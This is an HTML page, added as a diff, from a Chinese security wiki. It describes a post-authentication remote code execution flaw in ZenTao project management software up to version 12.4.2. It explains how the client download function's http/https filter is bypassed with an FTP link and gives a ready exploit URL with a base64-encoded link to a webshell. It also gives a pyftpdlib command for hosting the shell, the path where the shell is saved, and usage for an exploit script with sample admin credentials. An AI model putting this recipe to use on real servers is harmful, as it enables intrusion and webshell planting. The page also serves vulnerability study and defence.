@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_%3D12.4.2%20%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>禅道&lt;=12.4.2 后台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7985\u9053\u0026lt;=12.4.2 \u540e\u53f0getshell", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u5229\u7528", url: "#_1" },
+              {title: "\u4ee3\u7801\u5206\u6790", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u5229\u7528", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u5229\u7528EXP", url: "#exp" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A6%85%E9%81%93%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A6%85%E9%81%93%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="btn btn-xs btn-link">
+        禅道开源项目管理软件信息收集
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" class="btn btn-xs btn-link">
+        禅道 8.2-9.2.1 注入&amp;getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="1242-getshell">禅道&lt;=12.4.2 后台getshell<a class="headerlink" href="#1242-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞利用<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Exploit：</p>
+<p><a href="http://127.0.0.1/zentao/client-download-1-(base64">http://127.0.0.1/zentao/client-download-1-(base64</a> encode webshelldownload link)-1.html</p>
+<p><a href="http://127.0.0.1/zentao/data/client/1/(download">http://127.0.0.1/zentao/data/client/1/(download</a> link filename)</p>
+<p><strong>复现：</strong></p>
+<p><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image002.jpg" /></p>
+<p>使用**FTP****协议**下载文件，绕过**module/client/ext/model/xuanxuan.php:10** <strong>downloadZipPackage</strong> 的**HTTP****协议**过滤。</p>
+<p><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image004.jpg" /></p>
+<h2 id="_2">代码分析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>首先该漏洞需要后台管理员权限，所以我们首先登陆至后台。通过下图我们可以看到登陆后的界面URL为：
+<code>http://192.168.52.141/zentaopms/www/index.php?m=my&amp;f=index</code></p>
+<p><a href="https://p2.ssl.qhimg.com/t012b1edfbb5968327e.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t012b1edfbb5968327e.png" /></a></p>
+<p>我们看到后台界面分别对m以及f参数进行传参，那么不难猜出大概就是调用my类下的index方法，我们看一下该段的代码。</p>
+<p><a href="https://p1.ssl.qhimg.com/t0159e9407d7b4a59e9.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t0159e9407d7b4a59e9.png" /></a></p>
+<p>在/module/my/lang/zh-cn.php下可以看到存在指向index的方法，这验证了我们上面猜测是正确的，那么我们下面来看一下文件下载漏洞点的代码部分。</p>
+<p><a href="https://p2.ssl.qhimg.com/t01e389578003518177.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01e389578003518177.png" /></a></p>
+<p>漏洞是发生在client类下的donwload函数中，我们定位函数至/module/client/control.php中找到该方法，本段代码大致意思就是会接收三个参数version、os、link，然后去调用**downloadZipPackage**方法进行文件下载操作，并对一些下载失败事件进行不同回显，比如downloadFail，saveClientError在上图的方法列表我们可以看到他们调用的方法的具体含义，这里就不再赘述，最后如果没有失败事件时间就会返回成功。在downloadZipPackage并不需要os方法，所以这在我们后期利用时也不需要传入该参数。</p>
+<p><a href="https://p1.ssl.qhimg.com/t01bc3554884a1ddd3a.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01bc3554884a1ddd3a.png" /></a></p>
+<p>然后继续跟进downloadZipPackage方法中，注意重点来了，漏洞真正的产生原因就在该方法中。</p>
+<p><a href="https://p2.ssl.qhimg.com/t01d664441732fb42e4.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01d664441732fb42e4.png" /></a></p>
+<p>我们可以看到这段代码首先对传入的link参数进行了base64解码操作，这里的link参数就是我们shell的远程地址，然后下面会通过一个正则表达式进行判断，link地址是否以 http:// 或者 https:// 开头，如果存在则return返回false并退出方法，否则调用方法**parent::downloadZipPackage**，这里其实忽略了FTP这一文件下载方法，也就是说我们可以通过FTP服务代替进行文件下载操作从而绕过正则的限制。</p>
+<p><a href="https://p0.ssl.qhimg.com/t01be4bcd3b62e34b7c.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01be4bcd3b62e34b7c.png" /></a></p>
+<p>downloadZipPackage方法就没有什么问题了，就是一段文件下载函数，会通过传入的version值创建并命名在data下创建的文件夹并将下载的文件保存在其中。</p>
+<h2 id="_3">漏洞利用<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>那么这其实就是很清晰了，通过文章开始介绍的m和f参数的调用，我们可以对client类以及download参数进行调用，并传入download参数必要的version以及link参数就可以完成漏洞的利用了。这里的link地址是base64加密后的ftp连接地址，,比如:</p>
+<p><strong><a href="ftp://192.168.52.1/shell.php">ftp://192.168.52.1/shell.php</a></strong></p>
+<p>大家可以直接使用python的pyftpdlib模块开启FTP服务比较方便，命令:</p>
+<p>**python -m pyftpdlib -p 21 -d .**默认开启匿名用户，不需要输入用户名密码。</p>
+<p><a href="https://p0.ssl.qhimg.com/t010ff8a21f7d431f36.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t010ff8a21f7d431f36.png" /></a></p>
+<p>构建exp如下:</p>
+<div class="highlight"><pre><span></span><code>http://ip/zentaopms/www/index.php?m=client&amp;f=download&amp;version=1&amp;link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==
+</code></pre></div>
+<p>可以看到回显弹窗保存成功，然后再到靶机中查看发现下载成功，保存路径至</p>
+<div class="highlight"><pre><span></span><code>/zentaopms/www/data/client/1/shell.php
+</code></pre></div>
+<p><a href="https://p1.ssl.qhimg.com/t01e196a8e5fd936c20.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01e196a8e5fd936c20.png" /></a></p>
+<p>连接木马，成功利用！</p>
+<p><a href="https://p4.ssl.qhimg.com/t01f672108d970a681f.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01f672108d970a681f.png" /></a></p>
+<h2 id="exp">漏洞利用EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<p>所以本文最突出的一个部分来了，就是我们有EXP啊。通过两个夜晚的努力，终于完成了，其中也碰到了不少坑，但是好在都解决了。下面由我来介绍一下他的使用方法吧。</p>
+<p><a href="https://p3.ssl.qhimg.com/t01af2b24af5c3ddc4c.png"><img alt="img" src="resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/t01af2b24af5c3ddc4c.png" /></a></p>
+<p>构建命令:<code>python "Zentao RCE EXP.py" -H http://192.168.52.141 -U admin -P Admin888 -f 192.168.52.1</code></p>
+<p>其中-H指定目标主机，-U指定后台用户名，-P指定密码，-f指定VMnet8网卡的IP，这样虚拟机才能正常访问到物理机的FTP服务，当然如果测试环境也在虚拟机中则可以修改源码自动获取IP即可，这里是以我的环境为准所以没有这么做，也因为我觉得麻烦一点来换取兼容性更好一点是不亏的，所以小伙伴可以自行修改使用，我想这也不难，源码中也标注了修改位置。目前已经上传至github，有兴趣的小伙伴可以自行下载测试。</p>
+<p><strong>EXP github地址:</strong><code>https://github.com/wikiZ/Zentao-RCE</code></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A6%85%E9%81%93%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A6%85%E9%81%93%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="btn btn-xs btn-link">
+        禅道开源项目管理软件信息收集
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" class="btn btn-xs btn-link">
+        禅道 8.2-9.2.1 注入&amp;getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
